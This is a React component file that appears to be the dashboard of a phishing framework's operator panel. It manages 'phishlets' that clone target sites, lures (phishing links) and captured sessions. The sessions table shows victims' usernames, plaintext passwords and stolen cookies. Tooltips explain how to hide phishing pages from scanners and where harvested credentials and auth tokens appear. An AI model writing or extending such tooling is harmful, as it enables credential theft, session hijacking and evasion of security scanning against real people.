import React, { useEffect, useRef, useState } from 'react';
import { Link } from 'react-router-dom';
import { api, getPassword } from '../lib/api.js';
import Info from '../components/Info.jsx';
import SessionDetail from '../components/SessionDetail.jsx';

const POLL_MS = 5000;

export default function Dashboard() {
  const [phishlets, setPhishlets] = useState([]);
  const [lures, setLures] = useState([]);
  const [sessions, setSessions] = useState([]);
  const [error, setError] = useState('');
  const [busyName, setBusyName] = useState('');
  const [uploading, setUploading] = useState(false);
  const [detail, setDetail] = useState(null);
  const fileInputRef = useRef(null);

  function refresh() {
    api.get('/api/phishlets').then((d) => setPhishlets(d.phishlets)).catch((e) => setError(e.message));
    api.get('/api/lures').then((d) => setLures(d.rows)).catch(() => {});
    api.get('/api/sessions').then((d) => setSessions(d.rows)).catch(() => {});
  }

  useEffect(() => {
    refresh();
    const id = setInterval(refresh, POLL_MS);
    return () => clearInterval(id);
  }, []);

  async function viewSession(id) {
    try {
      const res = await api.get(`/api/sessions/${id}`);
      setDetail({ id, raw: res.raw, cookies: res.cookies });
    } catch (e) {
      setError(e.message);
    }
  }

  async function deleteSession(id) {
    if (!confirm(`Delete session ${id}?`)) return;
    await api.del(`/api/sessions/${id}`);
    if (detail?.id === id) setDetail(null);
    refresh();
  }

  async function uploadFile(e) {
    const file = e.target.files?.[0];
    if (!file) return;
    setUploading(true);
    setError('');
    try {
      const form = new FormData();
      form.append('file', file);
      const res = await fetch('/api/phishlets/upload', {
        method: 'POST',
        headers: { Authorization: 'Basic ' + btoa(':' + getPassword()) },
        body: form,
      });
      const body = await res.json();
      if (!res.ok) {
        if (res.status === 409 && confirm(`${body.error}. Overwrite it?`)) {
          const retry = new FormData();
          retry.append('file', file);
          retry.append('overwrite', 'true');
          const res2 = await fetch('/api/phishlets/upload', {
            method: 'POST',
            headers: { Authorization: 'Basic ' + btoa(':' + getPassword()) },
            body: retry,
          });
          if (!res2.ok) throw new Error((await res2.json()).error);
        } else {
          throw new Error(body.error);
        }
      }
      refresh();
    } catch (err) {
      setError(err.message);
    } finally {
      setUploading(false);
      if (fileInputRef.current) fileInputRef.current.value = '';
    }
  }

  async function toggle(name, enabled) {
    setBusyName(name);
    try {
      await api.post(`/api/phishlets/${name}/${enabled ? 'disable' : 'enable'}`);
      refresh();
    } catch (e) {
      setError(e.message);
    } finally {
      setBusyName('');
    }
  }

  return (
    <div className="stack">
      <h2>Dashboard</h2>
      {error && <div className="error-text">{error}</div>}

      <div className="card">
        <div className="row" style={{ justifyContent: 'space-between' }}>
          <h2 style={{ margin: 0 }}>
            Phishlets <Info text="A phishlet defines a target site to proxy/clone: which hosts to intercept, what to rewrite, and how to capture credentials and session tokens." />
          </h2>
          <div className="row">
            <input
              ref={fileInputRef}
              type="file"
              accept=".yaml,.yml"
              style={{ display: 'none' }}
              onChange={uploadFile}
            />
            <button disabled={uploading} onClick={() => fileInputRef.current?.click()} title="Upload an existing phishlet YAML file">
              {uploading ? 'Uploading...' : 'Upload phishlet'}
            </button>
            <Link to="/phishlets/new"><button className="primary">+ New phishlet</button></Link>
          </div>
        </div>
        <div className="table-scroll">
          <table>
            <thead>
              <tr>
                <th>Name</th>
                <th>Status <Info text="enabled phishlets are actively served; disabled ones are inert." /></th>
                <th>Visibility <Info text="hidden phishlets return nothing to scanners/unexpected visitors instead of the phishing page — set via Hide/Unhide on the phishlet page." /></th>
                <th>Hostname <Info text="The phishing subdomain this phishlet is bound to, e.g. www.yourlab.example." /></th>
                <th></th>
              </tr>
            </thead>
            <tbody>
              {phishlets.map((p) => (
                <tr key={p.name}>
                  <td>
                    <Link to={`/phishlets/${p.name}`}>{p.name}</Link>
                    {p.isChild && <span className="dim" style={{ fontSize: 11 }}> (child)</span>}
                  </td>
                  <td>
                    <span className={`badge ${p.status === 'enabled' ? 'enabled' : 'disabled'}`}>
                      {p.status || 'unknown'}
                    </span>
                  </td>
                  <td className="dim">{p.visibility || '-'}</td>
                  <td className="dim">{p.hostname || '-'}</td>
                  <td>
                    <button disabled={busyName === p.name} onClick={() => toggle(p.name, p.status === 'enabled')}>
                      {p.status === 'enabled' ? 'Disable' : 'Enable'}
                    </button>
                  </td>
                </tr>
              ))}
              {phishlets.length === 0 && <tr><td colSpan={5} className="dim">No phishlets yet.</td></tr>}
            </tbody>
          </table>
        </div>
      </div>

      <div className="card">
        <h2>Active Lures <Info text="Lures are individual phishing links generated from a phishlet. Manage them on the Lures page." /></h2>
        <div className="table-scroll">
          <table>
            <thead><tr><th>ID</th><th>Phishlet</th><th>Hostname</th></tr></thead>
            <tbody>
              {lures.map((l, i) => (
                <tr key={i}><td>{l.id}</td><td>{l.phishlet}</td><td>{l.hostname}</td></tr>
              ))}
              {lures.length === 0 && <tr><td colSpan={3} className="dim">No lures yet.</td></tr>}
            </tbody>
          </table>
        </div>
      </div>

      <div className="card">
        <h2>Sessions <Info text="A session is created whenever a visitor completes a lure — this is where captured credentials and auth tokens show up. Updates automatically every few seconds." /></h2>
        {detail && <SessionDetail {...detail} />}
        <div className="table-scroll">
          <table>
            <thead><tr><th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th></th></tr></thead>
            <tbody>
              {sessions.map((s, i) => (
                <tr key={i}>
                  <td>{s.id}</td><td>{s.phishlet}</td><td>{s.username}</td><td>{s.password}</td>
                  <td className="row">
                    <button onClick={() => viewSession(s.id)} title="Show captured auth tokens and full visit history">Details</button>
                    <button className="danger" onClick={() => deleteSession(s.id)}>Delete</button>
                  </td>
                </tr>
              ))}
              {sessions.length === 0 && <tr><td colSpan={5} className="dim">No sessions captured yet.</td></tr>}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
